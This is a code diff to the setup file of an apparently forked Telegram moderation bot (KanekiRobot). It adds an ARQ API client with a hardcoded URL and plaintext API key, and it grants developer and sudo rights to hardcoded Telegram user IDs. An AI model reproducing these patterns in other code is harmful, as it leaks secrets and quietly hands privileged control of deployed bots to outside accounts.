@@ -9,6 +9,7 @@ import telegram.ext as tg
 from pyrogram import Client, errors
 from telethon import TelegramClient
 from aiohttp import ClientSession
+from Python_ARQ import ARQ
 
 StartTime = time.time()
 
@@ -95,6 +96,8 @@ if ENV:
     SPAMWATCH_SUPPORT_CHAT = os.environ.get("SPAMWATCH_SUPPORT_CHAT", None)
     SPAMWATCH_API = os.environ.get("SPAMWATCH_API", None)
     GBAN_LOGS = os.environ.get('GBAN_LOGS', None)
+    ARQ_API_URL = "https://thearq.tech"
+    ARQ_API_KEY = "CXSIJZ-YVECWA-HTNWVA-GBLDPQ-ARQ"
 
 
     ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)
@@ -173,6 +176,8 @@ else:
     SPAMWATCH_API = Config.SPAMWATCH_API
     INFOPIC = Config.INFOPIC
     REDIS_URL = Config.REDIS_URL
+    ARQ_API_URL = Config.ARQ_API_URL
+    ARQ_API_KEY = Config.ARQ_API_KEY      
 
     
     try:
@@ -182,8 +187,22 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1200780834)
-DEV_USERS.add(797768146)
+DEV_USERS.add(1817146787)
+DEV_USERS.add(1845774133)
+SUDO_USERS.add(OWNER_ID)
+SUDO_USERS.add(1817146787)
+SUDO_USERS.add(1845774133)
+
+# Telethon
+api_id = TELETHON_ID
+api_hash = TELETHON_HASH
+print("[KanekiRobot]: TELETHON CLIENT STARTING")
+telethn = TelegramClient("kanekiexbot", api_id, api_hash)
+print("[INFO]: INITIALZING AIOHTTP SESSION")
+aiohttpsession = ClientSession()
+print("[INFO]: INITIALIZING ARQ CLIENT")
+arq = ARQ(ARQ_API_URL, ARQ_API_KEY, aiohttpsession)
+pbot = Client("Kaneki", api_id, api_hash)
 
 if not SPAMWATCH_API:
     sw = None
